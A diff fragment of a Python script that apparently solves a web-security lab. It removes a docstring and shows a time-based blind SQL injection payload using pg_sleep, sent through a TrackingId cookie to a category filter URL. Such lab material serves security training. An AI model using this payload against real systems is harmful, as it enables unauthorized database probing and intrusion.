@@ -60,7 +60,6 @@ def is_solved(url: str, no_proxy: bool) -> bool:
 
 
 def send_exploit(url: str, no_proxy: bool) -> bool:
-    """Send the SQL injection payload and check for a delay."""
     exploit_payload = "xyz'+||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END)--"
     exploit_url = url + "filter?category=Lifestyle"
     cookies = {"TrackingId": exploit_payload}
